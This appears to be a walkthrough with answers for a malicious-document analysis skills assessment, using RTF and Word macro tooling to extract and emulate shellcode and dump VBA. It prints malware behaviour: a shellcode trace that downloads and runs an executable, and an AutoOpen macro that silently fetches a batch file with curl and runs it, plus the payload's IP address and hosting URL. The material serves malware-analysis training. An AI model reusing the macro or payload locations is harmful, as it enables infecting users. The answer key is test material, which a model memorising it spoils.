[01:03:59:158] [50599:50600] [WARN][com.freerdp.crypto] - CN = Logging-VM
[01:03:59:158] [50599:50600] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[01:03:59:158] [50599:50600] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[01:03:59:158] [50599:50600] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[01:03:59:158] [50599:50600] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.220.233:3389) 
[01:03:59:158] [50599:50600] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[01:03:59:158] [50599:50600] [ERROR][com.freerdp.crypto] - Common Name (CN):
[01:03:59:158] [50599:50600] [ERROR][com.freerdp.crypto] - 	Logging-VM
[01:03:59:158] [50599:50600] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.220.233:3389 (RDP-Server):
	Common Name: Logging-VM
	Subject:     CN = Logging-VM
	Issuer:      CN = Logging-VM
	Thumbprint:  bc:24:1f:5e:2c:55:9e:5a:90:a9:fe:d0:f4:de:f2:97:51:03:f0:08:27:7d:3e:99:95:a2:bc:f6:ee:15:38:87
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will open the command prompt and use `trid` to analyze and identify the file format of the `Project_Outline.doc` file located in the `C:\Tools\Maldoc\assessment`:

Code: cmd

```cmd
trid C:\Tools\Maldoc\assessment\Project_Outline.doc
```

```
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>trid C:\Tools\Maldoc\assessment\Project_Outline.doc

TrID/32 - File Identifier v2.24 - (C) 2003-16 By M.Pontello
Definitions found:  18092
Analyzing...

Collecting data from file: C:\Tools\Maldoc\assessment\Project_Outline.doc
100.0% (.RTF) Rich Text Format (5000/1)
```

Students will come to know the `Project_Outline.doc` is an `RTF` (Rich Text Format) file. Subsequently, they will change their current working directory to `C:\Tools\MalDoc\Office\Tools\DidierStevensSuite\` and use `rtfdump.py` to display information about the objects present in the file:

Code: cmd

```cmd
cd C:\Tools\MalDoc\Office\Tools\DidierStevensSuite\
python .\rtfdump.py C:\Tools\Maldoc\assessment\Project_Outline.doc
```

```
C:\Users\Administrator>cd C:\Tools\MalDoc\Office\Tools\DidierStevensSuite\

C:\Tools\Maldoc\Office\Tools\DidierStevensSuite>python .\rtfdump.py C:\Tools\Maldoc\assessment\Project_Outline.doc

    1 Level  1        c=    2 p=00000000 l=   49995 h=    7827;      18 b=       0   u=    8156 \rtf1
    2  Level  2       c=    0 p=00000009 l=      19 h=       9;       9 b=       0   u=       2 \mbox
    3  Level  2       c=    1 p=0000001f l=   49963 h=    7827;      18 b=       0   u=    8156
    4   Level  3      c=    2 p=00003516 l=   36403 h=    3346;      18 b=       0 O u=       0 \objupdate5057450574
      Name: b'eQUAtiON.3\x00' Size: 1630 md5: 99af0243a3fd44becd3ba6c3520e341c magic: 027e8eeb
    5    Level  4     c=    0 p=0000353b l=      46 h=       0;      17 b=       0   u=       0 \*\aexpnd191940243
    6    Level  4     c=    0 p=0000356c l=      48 h=       9;      18 b=       0   u=       5 \*\group
```

Students will find the fourth object (`objupdate5057450574`) has a significant size, potentially holding a shellcode. They will use `rtfdump.py` to dump the shellcode located in the fourth object using the `--select`, `--hexdecode`, and `--dump` parameters to save the shellcode in an arbitrary file for further analysis:

Code: cmd

```cmd
python .\rtfdump.py C:\Tools\Maldoc\assessment\Project_Outline.doc --select 4 --hexdecode --dump > C:\Temp\academy_student.sc
```

```
C:\Tools\Maldoc\Office\Tools\DidierStevensSuite>python .\rtfdump.py C:\Tools\Maldoc\assessment\Project_Outline.doc --select 4 --hexdecode --dump > C:\Temp\academy_student.sc
```

Next, students will use `XORSearch.exe` to identify the entry point position (instruction pointer) of the shellcode within the `academy_student.sc` file:

Code: cmd

```cmd
XORSearch.exe -W C:\Temp\academy_student.sc
```

```
C:\Tools\Maldoc\Office\Tools\DidierStevensSuite>XORSearch.exe -W C:\Temp\academy_student.sc

Found XOR 00 position 0000006F: GetEIP method 3 E94B010000
Score: 10
```

With the obtained entry point address, students will use `scdbg.exe` located in the `C:\Tools\Maldoc\Office\Tools\scdbg\` directory to perform shellcode emulation and uncover the used functions (APIs) and the value for the IP address used within the `URLDownloadToFileW` function, respectively.

Code: cmd

```cmd
cd C:\Tools\Maldoc\Office\Tools\scdbg\
scdbg.exe /f C:\Temp\academy_student.sc /foff 6F
```

```
C:\Tools\Maldoc\Office\Tools\DidierStevensSuite>cd C:\Tools\Maldoc\Office\Tools\scdbg\

C:\Tools\Maldoc\Office\Tools\scdbg>scdbg.exe /f C:\Temp\academy_student.sc /foff 6F

Loaded 689 bytes from file C:\Temp\academy_student.sc
Initialization Complete..
Max Steps: 2000000
Using base offset: 0x401000
Execution starts at file offset 6f
40106f  E94B010000                      jmp 0x4011bf  vv
401074  8209B3                          or byte [ecx],0xb3
401077  69E54171043F                    imul esp,ebp,0x3f047141
40107d  DB1B                            fistp [ebx]
40107f  3A2B                            cmp ch,[ebx]

40144a  GetProcAddress(ExpandEnvironmentStringsW)
401493  ExpandEnvironmentStringsW(%APPDATA%\lawserhgj5784.exe, dst=12fb84, sz=104)
4014a8  LoadLibraryW(UrlMon)
4014c3  GetProcAddress(URLDownloadToFileW)
401527  URLDownloadToFileW(http://{hidden}/_errorpages/{hidden}.exe, C:\Users\Administrator\AppData\Roaming\lawserhgj5784.exe)
40153f  GetProcAddress(GetStartupInfoW)
401549  GetStartupInfoW(12fda4)
401560  GetProcAddress(CreateProcessW)
401585  {hidden}( , C:\Users\Administrator\AppData\Roaming\lawserhgj5784.exe ) = 0x1269
401599  GetProcAddress(ExitProcess)
40159d  ExitProcess(0)

Stepcount 41813
```

Answer: `2.59.254.18`

# Skills Assessment - Maldoc Analysis

## Question 2

### "In the same shellcode, what is the name of the file hosted at the remote server."

Students will reuse the output of the `scdbg.exe` shellcode emulator and will scrutinize the `URLDownloadToFileW` function to obtain the name of the executable hosted on the remote server:

Code: cmd

```cmd
scdbg.exe /f C:\Temp\academy_student.sc /foff 6F
```

```
C:\Tools\Maldoc\Office\Tools\scdbg>scdbg.exe /f C:\Temp\academy_student.sc /foff 6F

Loaded 689 bytes from file C:\Temp\academy_student.sc
Initialization Complete..
Max Steps: 2000000
Using base offset: 0x401000
Execution starts at file offset 6f
40106f  E94B010000                      jmp 0x4011bf  vv
401074  8209B3                          or byte [ecx],0xb3
401077  69E54171043F                    imul esp,ebp,0x3f047141
40107d  DB1B                            fistp [ebx]
40107f  3A2B                            cmp ch,[ebx]

40144a  GetProcAddress(ExpandEnvironmentStringsW)
401493  ExpandEnvironmentStringsW(%APPDATA%\lawserhgj5784.exe, dst=12fb84, sz=104)
4014a8  LoadLibraryW(UrlMon)
4014c3  GetProcAddress(URLDownloadToFileW)
401527  URLDownloadToFileW(http://{hidden}/_errorpages/{hidden}.exe, C:\Users\Administrator\AppData\Roaming\lawserhgj5784.exe)
40153f  GetProcAddress(GetStartupInfoW)
401549  GetStartupInfoW(12fda4)
401560  GetProcAddress(CreateProcessW)
401585  {hidden}( , C:\Users\Administrator\AppData\Roaming\lawserhgj5784.exe ) = 0x1269
401599  GetProcAddress(ExitProcess)
40159d  ExitProcess(0)

Stepcount 41813
```

Answer: `lawzx.exe`

# Skills Assessment - Maldoc Analysis

## Question 3

### "Identify the name of Windows API function that is used to execute the file %APPDATA%\\\\lawserhgj5784.exe in the shellcode."

Students will reuse the output of the `scdbg.exe` shellcode emulator and will scrutinize line `401585` to obtain the Windows API function used to execute the executable file:

Code: cmd

```cmd
scdbg.exe /f C:\Temp\academy_student.sc /foff 6F
```

```
C:\Tools\Maldoc\Office\Tools\scdbg>scdbg.exe /f C:\Temp\academy_student.sc /foff 6F

Loaded 689 bytes from file C:\Temp\academy_student.sc
Initialization Complete..
Max Steps: 2000000
Using base offset: 0x401000
Execution starts at file offset 6f
40106f  E94B010000                      jmp 0x4011bf  vv
401074  8209B3                          or byte [ecx],0xb3
401077  69E54171043F                    imul esp,ebp,0x3f047141
40107d  DB1B                            fistp [ebx]
40107f  3A2B                            cmp ch,[ebx]

40144a  GetProcAddress(ExpandEnvironmentStringsW)
401493  ExpandEnvironmentStringsW(%APPDATA%\lawserhgj5784.exe, dst=12fb84, sz=104)
4014a8  LoadLibraryW(UrlMon)
4014c3  GetProcAddress(URLDownloadToFileW)
401527  URLDownloadToFileW(http://{hidden}/_errorpages/{hidden}.exe, C:\Users\Administrator\AppData\Roaming\lawserhgj5784.exe)
40153f  GetProcAddress(GetStartupInfoW)
401549  GetStartupInfoW(12fda4)
401560  GetProcAddress(CreateProcessW)
401585  {hidden}( , C:\Users\Administrator\AppData\Roaming\lawserhgj5784.exe ) = 0x1269
401599  GetProcAddress(ExitProcess)
40159d  ExitProcess(0)

Stepcount 41813
```

Answer: `CreateProcessW`

# Skills Assessment - Maldoc Analysis

## Question 4

### "Identify the URL embedded within the macro in Benefits2024.doc that downloads a payload. Answer Format: https://<URL>/"

Students will begin with analyzing and identifying the file format of the `Benefits2024.doc` located in the `C:\Tools\Maldoc\assessment` directory using `trid`:

```cmd
trid C:\Tools\Maldoc\assessment\Benefits2024.docm
```
```
C:\Tools\Maldoc\Office\Tools\scdbg>trid C:\Tools\Maldoc\assessment\Benefits2024.docm

TrID/32 - File Identifier v2.24 - (C) 2003-16 By M.Pontello
Definitions found:  18092
Analyzing...

Collecting data from file: C:\Tools\Maldoc\assessment\Benefits2024.docm
 53.6% (.DOCM) Word Microsoft Office Open XML Format document (with Macro) (52000/1/9)
 24.2% (.DOCX) Word Microsoft Office Open XML Format document (23500/1/4)
 18.0% (.ZIP) Open Packaging Conventions container (17500/1/4)
  4.1% (.ZIP) ZIP compressed archive (4000/1)
```

Subsequently, students will verify that it is a Word document. They will use `oleid.py` to perform an analysis and check if the file contains macros:

```cmd
cd C:\Tools\Maldoc\Office\Tools\oletools
python .\oleid.py C:\Tools\Maldoc\assessment\Benefits2024.docm
```
```
C:\Tools\Maldoc\Office\Tools\scdbg>cd C:\Tools\Maldoc\Office\Tools\oletools

C:\Tools\Maldoc\Office\Tools\oletools>python .\oleid.py C:\Tools\Maldoc\assessment\Benefits2024.docm
XLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)
oleid 0.60.1 - http://decalage.info/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues

Filename: C:\Tools\Maldoc\assessment\Benefits2024.docm
WARNING  For now, VBA stomping cannot be detected for files in memory
--------------------+--------------------+----------+--------------------------
Indicator           |Value               |Risk      |Description
--------------------+--------------------+----------+--------------------------
File format         |MS Word 2007+ Macro-|info      |
                    |Enabled Document    |          |
                    |(.docm)             |          |
--------------------+--------------------+----------+--------------------------
Container format    |OpenXML             |info      |Container type
--------------------+--------------------+----------+--------------------------
Encrypted           |False               |none      |The file is not encrypted
--------------------+--------------------+----------+--------------------------
VBA Macros          |Yes, suspicious     |HIGH      |This file contains VBA
                    |                    |          |macros. Suspicious
                    |                    |          |keywords were found. Use
                    |                    |          |olevba and mraptor for
                    |                    |          |more info.
--------------------+--------------------+----------+--------------------------
XLM Macros          |No                  |none      |This file does not contain
                    |                    |          |Excel 4/XLM macros.
--------------------+--------------------+----------+--------------------------
External            |0                   |none      |External relationships
Relationships       |                    |          |such as remote templates,
                    |                    |          |remote OLE objects, etc
--------------------+--------------------+----------+--------------------------
```

With the obtained information related macros in the file, students will use `olevba.py` to dump information about the macro and the code within it. They will find the embedded URL within the `Beatrix` variable:

```cmd
python .\olevba.py C:\Tools\Maldoc\assessment\Benefits2024.docm
```
```
C:\Tools\Maldoc\Office\Tools\oletools>python .\olevba.py C:\Tools\Maldoc\assessment\Benefits2024.docm

XLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)
olevba 0.60.2 on Python 3.12.4 - http://decalage.info/python/oletools
===============================================================================
FILE: C:\Tools\Maldoc\assessment\Benefits2024.docm
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls
in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas
in file: word/vbaProject.bin - OLE stream: 'VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Sub AutoOpen()
'
' AutoOpen Macro
'
'

Beatrix = "{hidden}"
Shell ("cmd /c curl -L -o %APPDATA%\Pun.bat " & Beatrix & " && %APPDATA%\Pun.bat"), vbHide
End Sub

<SNIP>
```

Answer: `https://gitlab.com/DemoTrojan/real/-/raw/main/check.bat`